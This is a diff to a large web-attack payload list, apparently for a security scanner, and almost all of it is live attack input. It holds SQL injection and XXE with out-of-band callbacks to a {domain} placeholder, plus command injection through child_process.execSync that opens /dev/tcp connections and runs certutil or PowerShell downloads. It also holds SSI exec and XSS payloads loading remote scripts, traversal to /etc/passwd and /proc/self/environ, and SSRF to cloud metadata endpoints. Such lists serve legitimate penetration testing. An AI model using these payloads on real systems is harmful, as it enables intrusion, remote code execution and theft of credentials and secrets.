@@ -38,7 +38,7 @@ SELECT @@version--
 SELECT @@version-- -
 SELECT banner FROM v$version--
 SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-	SELECT sql FROM sqlite_schema
+SELECT sql FROM sqlite_schema
 SELECT version FROM v$instance--
 SELECT version()--
 SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
@@ -98,7 +98,7 @@ xp_cmdshell 'whoami.exe'
 'SELECT @@version-- -
 'SELECT banner FROM v$version--
 'SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-	'SELECT sql FROM sqlite_schema
+'SELECT sql FROM sqlite_schema
 'SELECT version FROM v$instance--
 'SELECT version()--
 'SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
@@ -158,7 +158,7 @@ xp_cmdshell 'whoami.exe'
 \"SELECT @@version-- -
 \"SELECT banner FROM v$version--
 \"SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-	\"SELECT sql FROM sqlite_schema
+\"SELECT sql FROM sqlite_schema
 \"SELECT version FROM v$instance--
 \"SELECT version()--
 \"SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
@@ -218,7 +218,7 @@ xp_cmdshell 'whoami.exe'
 ;SELECT @@version-- -
 ;SELECT banner FROM v$version--
 ;SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-	;SELECT sql FROM sqlite_schema
+;SELECT sql FROM sqlite_schema
 ;SELECT version FROM v$instance--
 ;SELECT version()--
 ;SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
@@ -242,7 +242,7 @@ copy (select '') to program 'nslookup {domain}}'
 ;attach database '\/\/{domain}\/z' as 'z'-- -
 (SELECT load_extension('\/\/{domain}'))
 SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-	SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
+SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
 EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
 BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
 EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
@@ -252,7 +252,7 @@ SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
 ';attach database '\/\/{domain}\/z' as 'z'-- -
 '(SELECT load_extension('\/\/{domain}'))
 'SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-	'SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
+'SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
 'EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
 'BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
 'EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
@@ -262,7 +262,7 @@ SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
 \";attach database '\/\/{domain}\/z' as 'z'-- -
 \"(SELECT load_extension('\/\/{domain}'))
 \"SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-	\"SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
+\"SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
 \"EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
 \"BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
 \"EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
@@ -272,7 +272,7 @@ SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
 ;;attach database '\/\/{domain}\/z' as 'z'-- -
 ;(SELECT load_extension('\/\/{domain}'))
 ;SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-	;SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
+;SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
 ;EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
 ;BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
 ;EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
@@ -512,7 +512,7 @@ powershell -c Invoke-WebRequest 'http:\/\/{domain}'
 && powershell -c Invoke-WebRequest 'http:\/\/{domain}'
 ;powershell -c Invoke-WebRequest 'http:\/\/{domain}'
 ${{<%[%'\"}}%\\
-	-
+-
 --
 -v
 --version
@@ -664,6 +664,16 @@ child_process.execSync(`powershell -c (New-Object Net.WebClient).DownloadString(
 child_process.execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`);
 child_process.execSync(`printenv`);
 child_process.execSync(`sleep 9`);
+require('child_process').execSync(`\/bin\/bash -c true > \/dev\/tcp\/{domain}\/80`).toString());
+require('child_process').execSync(`\/bin\/sh -c true > \/dev\/tcp\/{domain}\/80`).toString());
+require('child_process').execSync(`certutil -urlcache -f 'http:\/\/{domain}'`).toString());
+require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString());
+require('child_process').execSync(`id`).toString());
+require('child_process').execSync(`ping {domain} -c 2`).toString());
+require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`).toString());
+require('child_process').execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`).toString());
+require('child_process').execSync(`printenv`).toString());
+require('child_process').execSync(`sleep 9`).toString());
 cos%0Asystem%0A(S%27curl%20{domain}%27%0AtR.%0A
 cos%0Asystem%0A(S%27hostname%27%0AtR.%0A
 cos%0Asystem%0A(S%27ping%20-c%205%20127.0.0.1%27%0AtR.%0A
@@ -770,7 +780,7 @@ system('sleep 9')
 }#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}#{
 }${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}${
 }${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}${
-	$HOME
+$HOME
 $ENV{'HOME'}
 %d
 %s%s%s%s%s
@@ -782,7 +792,7 @@ $ENV{'HOME'}
 ([a-zA-Z]+)*$
 ((a+)+)+$
 ${{<%[%'\"}}%\\
-	{% debug %}
+{% debug %}
 {{settings.SECRET_KEY}}
 {{7*'7'}}
 {{7*7}}
@@ -797,13 +807,13 @@ ${{1337*1337}}
 #{1337*1337}
 {{7*7}}[7*7]
 {{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'\"}}%\\
-	{{1337*1337}}[1337*1337]
+{{1337*1337}}[1337*1337]
 {{1337*1337}}${1337*1337}<%= 1337*1337 %>${{1337*1337}}#{1337*1337}${{<%[%'\"}}%\\
 }}{{7*7}}][7*7]
 }}{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'\"}}%\\
 }}{{1337*1337}}][1337*1337]
 }}{{1337*1337}}${1337*1337}<%= 1337*1337 %>${{1337*1337}}#{1337*1337}${{<%[%'\"}}%\\
-	{{ get_user_file(\"C:\\boot.ini\") }}
+{{ get_user_file(\"C:\\boot.ini\") }}
 {{ get_user_file(\"\/etc\/hosts\") }}
 {{ get_user_file(\"\/etc\/passwd\") }}
 {{person.secret}}
@@ -824,17 +834,17 @@ ${\"freemarker.template.utility.Execute\"?new()(\"exec 6< \/dev\/tcp\/{domain}\/
 ${\"freemarker.template.utility.Execute\"?new()(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")}
 ${\"freemarker.template.utility.Execute\"?new()(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")}
 <!DOCTYPE example [<!ENTITY xxe SYSTEM \"file:\/\/\/etc\/passwd\">]><root>&xxe;<\/root>
-	%3C%21DOCTYPE%20example%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
+%3C%21DOCTYPE%20example%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
 <!DOCTYPE example [<!ENTITY xxe SYSTEM \"http:\/\/{domain}\">]><root>&xxe;<\/root>
-	%3C%21DOCTYPE%20example%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F{domain}%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
+%3C%21DOCTYPE%20example%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F{domain}%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
 <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:\/\/\/etc\/passwd\" >]><foo>&xxe;<\/foo>
-	<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:\/\/\/proc\/self\/environ\" >]><foo>&xxe;<\/foo>
-	<!--#exec cmd=\"\/bin\/bash -c true > \/dev\/tcp\/{domain}\/80\" -->
+<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:\/\/\/proc\/self\/environ\" >]><foo>&xxe;<\/foo>
+<!--#exec cmd=\"\/bin\/bash -c true > \/dev\/tcp\/{domain}\/80\" -->
 <!--#exec cmd=\"\/bin\/ls \/\" -->
 <!--#exec cmd=\"\/bin\/sh -c true > \/dev\/tcp\/{domain}\/80\" -->
 <!--#exec cmd=\"cat \/etc\/passwd\" -->
 <!--#exec cmd=\"cd C:\\WINDOWS\\System32\">
-	<!--#exec cmd=\"certutil -urlcache -f 'http:\/\/{domain}'\" -->
+<!--#exec cmd=\"certutil -urlcache -f 'http:\/\/{domain}'\" -->
 <!--#exec cmd=\"dir\" -->
 <!--#exec cmd=\"exec 6< \/dev\/tcp\/{domain}\/80\" -->
 <!--#exec cmd=\"id\" -->
@@ -846,22 +856,22 @@ ${\"freemarker.template.utility.Execute\"?new()(\"powershell -c Invoke-WebReques
 <!--#exec cmd=\"sleep\" -->
 <!--#exec cmd=\"timeout 5\" -->
 <pre><!--#echo var=\"DATE_LOCAL\" --> <\/pre>
-	<pre><!--#exec cmd=\"\/bin\/bash -c true > \/dev\/tcp\/{domain}\/80\"--><\/pre>
-	<pre><!--#exec cmd=\"\/bin\/sh -c true > \/dev\/tcp\/{domain}\/80\"--><\/pre>
-	<pre><!--#exec cmd=\"cat \/etc\/passwd\"--><\/pre>
-	<pre><!--#exec cmd=\"certutil -urlcache -f 'http:\/\/{domain}'\"--><\/pre>
-	<pre><!--#exec cmd=\"dir\" --><\/pre>
-	<pre><!--#exec cmd=\"exec 6< \/dev\/tcp\/{domain}\/80\"--><\/pre>
-	<pre><!--#exec cmd=\"id\"--><\/pre>
-	<pre><!--#exec cmd=\"ls\" --><\/pre>
-	<pre><!--#exec cmd=\"ping {domain}\"--><\/pre>
-	<pre><!--#exec cmd=\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\"--><\/pre>
-	<pre><!--#exec cmd=\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\"--><\/pre>
-	<pre><!--#exec cmd=\"printenv\"--><\/pre>
-	<pre><!--#exec cmd=\"sleep 9\"--><\/pre>
-	<pre><!--#exec cmd=\"timeout 9\" --><\/pre>
-	<pre><!--#exec cmd=\"whoami\"--><\/pre>
-	<!--#config errmsg=\"File not found, informs users and password\"-->
+<pre><!--#exec cmd=\"\/bin\/bash -c true > \/dev\/tcp\/{domain}\/80\"--><\/pre>
+<pre><!--#exec cmd=\"\/bin\/sh -c true > \/dev\/tcp\/{domain}\/80\"--><\/pre>
+<pre><!--#exec cmd=\"cat \/etc\/passwd\"--><\/pre>
+<pre><!--#exec cmd=\"certutil -urlcache -f 'http:\/\/{domain}'\"--><\/pre>
+<pre><!--#exec cmd=\"dir\" --><\/pre>
+<pre><!--#exec cmd=\"exec 6< \/dev\/tcp\/{domain}\/80\"--><\/pre>
+<pre><!--#exec cmd=\"id\"--><\/pre>
+<pre><!--#exec cmd=\"ls\" --><\/pre>
+<pre><!--#exec cmd=\"ping {domain}\"--><\/pre>
+<pre><!--#exec cmd=\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\"--><\/pre>
+<pre><!--#exec cmd=\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\"--><\/pre>
+<pre><!--#exec cmd=\"printenv\"--><\/pre>
+<pre><!--#exec cmd=\"sleep 9\"--><\/pre>
+<pre><!--#exec cmd=\"timeout 9\" --><\/pre>
+<pre><!--#exec cmd=\"whoami\"--><\/pre>
+<!--#config errmsg=\"File not found, informs users and password\"-->
 <!--#echo var=\"DOCUMENT_NAME\" -->
 <!--#echo var=\"DOCUMENT_URI\" -->
 <!--#config timefmt=\"A %B %d %Y %r\"-->
@@ -871,22 +881,22 @@ ${\"freemarker.template.utility.Execute\"?new()(\"powershell -c Invoke-WebReques
 <!--#exec cmd=\"whoami\"-->
 <!--#printenv -->
 <!--#flastmod virtual=\"echo.html\" -->
-<!--#echo var=\"DATE_LOCAL\" --><!--#exec cmd=\"ls\" --><esi:include src=http:\/\/{domain}\/>x=<esi:assign name=\"var1\" value=\"'cript'\"\/><s<esi:vars name=\"$(var1)\"\/>>alert(\/Chrome%20XSS%20filter%20bypass\/);<\/s<esi:vars name=\"$(var1)\"\/>>
+<!--#echo var=\"DATE_LOCAL\" --><!--#exec cmd=\"ls\" --><esi:include src=\/\/{domain}\/>x=<esi:assign name=\"var1\" value=\"'cript'\"\/><s<esi:vars name=\"$(var1)\"\/>>alert(\/Chrome%20XSS%20filter%20bypass\/);<\/s<esi:vars name=\"$(var1)\"\/>>
 <xsl:value-of select=\"system-property('xsl:version')\" \/><esi:include src=\"http:\/\/{domain}\/data\/news.xml\" stylesheet=\"http:\/\/{domain}\/\/news_template.xsl\"><\/esi:include>
-	javascript:\/*-- >]]>%>?><\/script><\/title><\/textarea><\/noscript><\/style><\/xmp>\">[img=1,name=\/alert(1)\/.source]<img - \/style=a:expression&#40&#47&#42'\/- \/*&#39,\/**\/eval(name)\/*%2A\/\/\/*\/\/\/&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name)onclick=eval(name) onmouseover=eval(name) onbegin=eval(name)background=javascript:eval(name)\/\/>\"
-	<img src=\"{domain}\">
+javascript:\/*-- >]]>%>?><\/script><\/title><\/textarea><\/noscript><\/style><\/xmp>\">[img=1,name=\/alert(1)\/.source]<img - \/style=a:expression&#40&#47&#42'\/- \/*&#39,\/**\/eval(name)\/*%2A\/\/\/*\/\/\/&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name)onclick=eval(name) onmouseover=eval(name) onbegin=eval(name)background=javascript:eval(name)\/\/>\"
+<img src=\/\/{domain}>
 <script>prompt()<\/script>
 \"'`><img src=x onerror=prompt() \/>
-\"'`><img src=\"{domain}\"\" onerror=prompt() \/>
+\"'`><img src=\/\/{domain} onerror=prompt() \/>
 \" onclick=alert() a=\"
-'\"><img src=x onerror=alert(1) \/>
+'\"><img src=\/\/{domain} onerror=alert(1) \/>
 javascript:alert()
 javascript:\"\/*'\/*`\/*--><\/noscript><\/title><\/textarea><\/style><\/template><\/noembed><\/script><html \\\" onmouseover=\/*&lt;svg\/*\/onload=alert()\/\/>
 -->'\"\/><\/sCript><deTailS open x=\">\" ontoggle=(co\\u006efirm)``>
-\">><marquee><img src=x onerror=confirm(1)><\/marquee>\" ><\/plaintext\\><\/|\\><plaintext\/onmouseover=prompt(1) ><script>prompt(1)<\/script>@gmail.com<isindex formaction=javascript:alert(\/XSS\/) type=submit>'-->\" ><\/script><script>alert(1)<\/script>\"><img\/id=\"confirm( 1)\"\/alt=\"\/\"src=\"\/\"onerror=eval(id&%23x29;>'\"><img src=\"http:\/\/{domain}\">
+\">><marquee><img src=\/\/{domain} onerror=confirm(1)><\/marquee>\" ><\/plaintext\\><\/|\\><plaintext\/onmouseover=prompt(1) ><script>prompt(1)<\/script>@gmail.com<isindex formaction=javascript:alert(\/XSS\/) type=submit>'-->\" ><\/script><script>alert(1)<\/script>\"><img\/id=\"confirm( 1)\"\/alt=\"\/\"src=\"\/\/{domain}\"onerror=eval(id&%23x29;>'\"><img src=\"http:\/\/{domain}\">
 \" onclick=alert(1)\/\/<button \u2018 onclick=alert(1)\/\/> *\/ alert(1)\/\/
 ';alert(String.fromCharCode(88,83,83))\/\/';alert(String. fromCharCode(88,83,83))\/\/\";alert(String.fromCharCode (88,83,83))\/\/\";alert(String.fromCharCode(88,83,83))\/\/-- ><\/SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83)) <\/SCRIPT>
-\"'`><ImG Src=X OnerRor=ProMpt(DoCumEnt.DoMAIn)
+\"'`><ImG Src=\/\/{domain} OnerRor=ProMpt(DoCumEnt.DoMAIn)
 javascript:alert(1)
 jaVasCript:\/*-\/*`\/*\\`\/*'\/*\"\/**\/(\/* *\/oNcliCk=alert() )\/\/%0D%0A%0d%0a\/\/<\/stYle\/<\/titLe\/<\/teXtarEa\/<\/scRipt\/--!>\\x3csVg\/<sVg\/oNloAd=alert()\/\/>\\x3e
 %3f%0d%0aLocation:%0d%0aContent-Type:text\/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C\/script%3E
@@ -897,7 +907,7 @@ jaVasCript:\/*-\/*`\/*\\`\/*'\/*\"\/**\/(\/* *\/oNcliCk=alert() )\/\/%0D%0A%0d%0
 \"><scRiPt src=\/\/{domain}><\/scRiPt>
 `><scRiPt src=\/\/{domain}><\/scRiPt>
 \"'`><scRiPt src=\/\/{domain}><\/scRiPt>
-JAvasCripT:eval('var a=document.createElement(\\'scrIpT\\');a.src=\\'https:\/\/{domain}\\';document.body.appendChild(a)')
+JAvasCripT:eval('var a=document.createElement(\\'scrIpT\\');a.src='\/\/{domain}\\';document.body.appendChild(a)')
 <ScrIPt>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"\/\/{domain}\");a.send();<\/sCrIPt>
 <sCrIpt>$.getScript(\"\/\/{domain}\")<\/sCRipt>
 <\/script><svg\/onload='+\/\"\/+\/onmouseover=1\/
@@ -918,7 +928,17 @@ input[value='\\\">\\<script>prompt(1)\/\/>\\\"']
 \/\/%0D%0A%0d%0a\/\/<ScRiPT>$.getScRiPT(\"\/\/{domain}\")<\/ScRiPT>
 \/\/%0D%0A%0d%0a\/\/><ScRiPT src=\/\/{domain}><\/ScRiPT>
 \/\/%0D%0A%0d%0a\/\/><ScRiPT>$.getScRiPT(\"\/\/{domain}\")<\/ScRiPT>
-%0d%0aLocation:%20http:\/\/{domain}
+%0d%0aLocation:%20\/\/{domain}
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`\/bin\/bash -c true > \/dev\/tcp\/{domain}\/80`).toString());\">
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`\/bin\/sh -c true > \/dev\/tcp\/{domain}\/80`).toString());\">
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`certutil -urlcache -f 'http:\/\/{domain}'`).toString());\">
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString());\">
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`id`).toString());\">
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`ping {domain} -c 2`).toString());\">
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`).toString());\">
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`).toString());\">
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`printenv`).toString());\">
+\"'`><img src=\/\/{domain} onerror=\"confirm(require('child_process').execSync(`sleep 9`).toString());\">
 \/etc\/passwd
 ..\/etc\/passwd
 ..\/..\/etc\/passwd
@@ -936,6 +956,15 @@ input[value='\\\">\\<script>prompt(1)\/\/>\\\"']
 ....\/\/....\/\/etc\/hostname
 ....\/\/....\/\/....\/\/etc\/hostname
 ..\/..\/..\/..\/..\/..\/etc\/hosts
+..\/..\/..\/..\/..\/..\/proc\/self\/environ
+..\\..\\..\\..\\..\\..\\proc\\self\\environ
+\/proc\/self\/environ
+..\/proc\/self\/environ
+..\/..\/proc\/self\/environ
+..\/..\/..\/..\/proc\/self\/environ
+....\/\/proc\/self\/environ
+....\/\/....\/\/proc\/self\/environ
+....\/\/....\/\/....\/\/proc\/self\/environ
 ..\/..\/..\/..\/..\/..\/proc\/1\/environ
 ..\\..\\..\\..\\..\\..\\proc\\1\\environ
 \/proc\/1\/environ
@@ -990,10 +1019,26 @@ http:\/\/{domain}
 {white-listed-domain}.{domain}
 https:\/\/{domain}
 \/\/{domain}
+http:\/\/169.254.169.254
+http:\/\/169.254.169.254\/
+\/\/169.254.169.254\/
+\\\\169.254.169.254\/
+http:\/\/169.254.169.254\/metadata
+http:\/\/169.254.169.254\/metadata\/
+\/\/169.254.169.254\/metadata\/
+\\\\169.254.169.254\/metadata\\
 http:\/\/169.254.169.254\/latest\/metadata
 http:\/\/169.254.169.254\/latest\/metadata\/
-\\\\169.254.169.254\/latest\/metadata
 \/\/169.254.169.254\/latest\/metadata
+\\\\169.254.169.254\\latest\\metadata
+http:\/\/169.254.169.254\/metadata\/v1
+http:\/\/169.254.169.254\/metadata\/v1\/
+\/\/169.254.169.254\/metadata\/v1\/
+\\\\169.254.169.254\\metadata\\v1\\
+http:\/\/metadata.google.internal\/computeMetadata\/v1
+http:\/\/metadata.google.internal\/computeMetadata\/v1\/
+\/\/metadata.google.internal\/computeMetadata\/v1
+\\\\metadata.google.internal\\computeMetadata\\v1
 \/etc\/passwd%00
 ..\/etc\/passwd%00
 ..\/..\/etc\/passwd%00
@@ -1011,6 +1056,15 @@ http:\/\/169.254.169.254\/latest\/metadata\/
 ....\/\/....\/\/etc\/hostname%00
 ....\/\/....\/\/....\/\/etc\/hostname%00
 ..\/..\/..\/..\/..\/..\/etc\/hosts%00
+..\/..\/..\/..\/..\/..\/proc\/self\/environ%00
+..\\..\\..\\..\\..\\..\\proc\\self\\environ%00
+\/proc\/self\/environ%00
+..\/proc\/self\/environ%00
+..\/..\/proc\/self\/environ%00
+..\/..\/..\/..\/proc\/self\/environ%00
+....\/\/proc\/self\/environ%00
+....\/\/....\/\/proc\/self\/environ%00
+....\/\/....\/\/....\/\/proc\/self\/environ%00
 ..\/..\/..\/..\/..\/..\/proc\/1\/environ%00
 ..\\..\\..\\..\\..\\..\\proc\\1\\environ%00
 \/proc\/1\/environ%00
@@ -1065,10 +1119,26 @@ http:\/\/{domain}%00
 {white-listed-domain}.{domain}%00
 https:\/\/{domain}%00
 \/\/{domain}%00
+http:\/\/169.254.169.254%00
+http:\/\/169.254.169.254\/%00
+\/\/169.254.169.254\/%00
+\\\\169.254.169.254\/%00
+http:\/\/169.254.169.254\/metadata%00
+http:\/\/169.254.169.254\/metadata\/%00
+\/\/169.254.169.254\/metadata\/%00
+\\\\169.254.169.254\/metadata\\%00
 http:\/\/169.254.169.254\/latest\/metadata%00
 http:\/\/169.254.169.254\/latest\/metadata\/%00
-\\\\169.254.169.254\/latest\/metadata%00
 \/\/169.254.169.254\/latest\/metadata%00
+\\\\169.254.169.254\\latest\\metadata%00
+http:\/\/169.254.169.254\/metadata\/v1%00
+http:\/\/169.254.169.254\/metadata\/v1\/%00
+\/\/169.254.169.254\/metadata\/v1\/%00
+\\\\169.254.169.254\\metadata\\v1\\%00
+http:\/\/metadata.google.internal\/computeMetadata\/v1%00
+http:\/\/metadata.google.internal\/computeMetadata\/v1\/%00
+\/\/metadata.google.internal\/computeMetadata\/v1%00
+\\\\metadata.google.internal\\computeMetadata\\v1%00
 %E2%A0%80%0A%E2%A0%80
 undefined
 undef
